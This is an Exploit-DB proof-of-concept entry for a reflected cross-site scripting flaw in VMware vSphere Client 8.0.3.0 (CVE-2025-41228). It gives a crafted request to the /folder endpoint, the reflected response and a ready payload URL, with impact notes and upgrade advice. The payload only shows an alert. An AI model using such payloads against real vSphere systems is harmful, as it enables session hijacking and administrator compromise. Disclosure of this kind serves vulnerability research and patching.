---
title: [webapps] VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)
url: https://www.exploit-db.com/exploits/52406
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:47:59.064814
---

# [webapps] VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)

#### EDB-ID:

###### 52406

#### CVE:

###### [2025-41228](https://nvd.nist.gov/vuln/detail/CVE-2025-41228)

---

**EDB Verified:**

#### Author:

###### [Imraan Khan (Lich-Sec)](/?author=12301)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
# VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)

- **Exploit Title**: VMware vSphere Client 8.0.3.0 - Reflected Cross-Site Scripting (XSS)
- **Date**: 2025-08-08
- **Exploit Author**: Imraan Khan (Lich-Sec)
- **Vendor Homepage**: [https://www.vmware.com](https://www.vmware.com)
- **Version**: vSphere Client 8.0.3.0
- **Tested On**: Web interface (Chrome 138)
- **CVE**: CVE-2025-41228
- **Category**: WebApps

---

## Description

A reflected Cross-Site Scripting (XSS) vulnerability exists in VMware vSphere Client version 8.0.3.0. The application fails to sanitize input passed via a query string to the `/folder` endpoint, resulting in arbitrary JavaScript execution when the reflected value is rendered into an HTML form’s `action` attribute.

The vulnerability was confirmed by intercepting a request through Burp Suite and injecting a malicious payload. This XSS only successfully executes when the response is rendered by a browser within an **active session**, such as one initiated via prior authentication.

---

## Steps to Reproduce

### 1. Initiate request to vulnerable endpoint

Open a browser and navigate to:

```
https://host/folder?ht7j4
```

This sends a benign request that you will intercept.

---

### 2. Intercept and modify the request using Burp Suite

With Burp Suite proxy enabled, capture the request and modify the query string to inject the XSS payload:

```
GET /folder?ht7j4"><script>alert('ThisIsAnXSSBug')</script>tnkav=1 HTTP/2
Host: 192.168.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Referer: https://192.168.x.x/
Accept: text/html,application/xhtml+xml
```

Then forward the request to the server.

---

### 3. Observe the reflected payload in the HTTP response

In the Burp HTTP Response, the payload appears unencoded within the HTML:

```html
<form action="/folder?ht7j4"><script>alert('ThisIsAnXSSBug')</script>tnkav=1" method="POST">
  <input name="VMware-CSRF-Token" type="hidden" value="..." />
```

This confirms that the payload is reflected back into the HTML in a dangerous context — inside a form’s `action` attribute — allowing script execution.

---

### 4. Trigger script execution

Because the XSS is reflected but only renders within the full browser context, to observe the popup:

- Forward the exact same malicious request using Burp **with an authenticated session (cookies included)**.
- OR, use Burp's **"Open in Browser"** feature (with session cookies) to request the full response as a browser would.

Upon rendering the page, the browser will execute the injected `<script>`.

Example payload URL:

```
https://192.168.x.x/folder?ht7j4"><script>alert(1)</script>tnkav=1
```

---

## Impact

Successful exploitation results in arbitrary JavaScript execution within the vSphere Client’s web interface. This could be leveraged for phishing, session hijacking, or further compromise of the admin's browser session.

---

## Recommendation

Upgrade to VMware vCenter Server version **8.0 U3e or later**, which remediates **CVE-2025-41228**.

---

## References

- https://nvd.nist.gov/vuln/detail/CVE-2025-41228
- https://www.vmware.com/security/advisories
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-databa...